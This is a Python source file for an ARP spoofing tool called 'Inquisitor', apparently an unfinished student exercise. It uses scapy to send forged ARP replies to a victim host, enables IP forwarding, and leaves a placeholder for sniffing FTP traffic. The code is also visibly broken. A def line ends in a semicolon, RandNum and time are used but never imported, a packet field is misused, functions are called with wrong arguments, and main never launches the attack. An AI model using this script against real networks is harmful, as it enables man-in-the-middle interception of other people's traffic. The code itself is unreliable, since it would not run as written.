import argparse
import re
import logging
import sys
from scapy.all import ARP, send


def validate_ipv4(ip):
    pattern = re.compile(r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$')
    match = pattern.match(ip)

    if not match:
        return False

    return all(0 <= int(octet) <= 255 for octet in match.groups())

def validate_mac(mac):
    pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]?){5}([0-9A-Fa-f]{2})$')
    return pattern.match(mac) is not None

def parse_args():
    parser = argparse.ArgumentParser(prog="Inquisitor",
                                     description="ARP spoofing or ARP poisoning program",
                                     epilog="./inquisitor <src_ip> <src_mac> <target_ip> <target_mac>")
    parser.add_argument("src_ip", metavar="IP-src", help= "source IP address")
    parser.add_argument("src_mac", metavar="MAC-src", help= "source MAC address (format AA:BB:DD:EE:FF)")
    parser.add_argument("target_ip", metavar="IP-target", help= "target IP address")
    parser.add_argument("target_mac", metavar="MAC-target", help= "target MAC address (format AA:BB:DD:EE:FF)")
    parser.add_argument("-v","--verbose", action="store_true", help="Verbose mode - show all FTP traffic including")
    args = parser.parse_args()
    if not validate_ipv4(args.src_ip) or not validate_ipv4(args.target_ip):
        parser.error("Invalid IP address format")
    if not validate_mac(args.src_mac) or not validate_mac(args.target_mac):
        parser.error("Invalid MAC format")
    logging.info(f"Source (spoofed) IP: {args.src_ip} MAC: {args.src_mac}")
    logging.info(f"Victim IP: {args.target_ip} MAC: {args.target_mac}")
    return args

class Inquisitor:
    def __init__(self,src_ip, src_mac, target_ip, target_mac, verbose=False):
        self.src_ip = src_ip
        self.src_mac = src_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.verbose = verbose
        self.running = True

# Ip forwarding or Routing - 0 = off 1 = on or i can also use this command when i create my container ? sysctl -w net.ipv4.ip_forward=1
# can run  sysctl -p to check
    def ip_forwarding(self):
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            logging.info("[+] IP forwarding enabled")
        except Exception as e:
            logging.warning(f"[!] Could not enable IP forwarding: {e}")

    def arp_poison(self, target_ip, target_mac);
        while self.running:
            packet = ARP(
                op=2,
                hwsrc=self.src_mac,
                psrc=self.src_ip,
                hwdst=target_mac,
                pdst=target_ip,
                inter=RandNum(10,40),
            )
            send(packet, verbose = False)
            time.sleep(2)

# faire un threading ici
    def start_poisoning(self):
        self.arp_poison(self.target_ip, self.target_mac, self.src_ip)
        self.arp_poison(self.src_ip,)

    
#Sniffer le SFTP ici






def main():
        
    logging.basicConfig(
        level=logging.INFO,
        format='[%(levelname)s] %(message)s')
    try:
        args = parse_args()
    
    except KeyboardInterrupt:
        logging.info("Interrupted by user CTRL+C")
        sys.exit(0)

    except Exception as e:
        logging.error("Error {e}")
        sys.exit(1)

if __name__ == '__main__':
   main()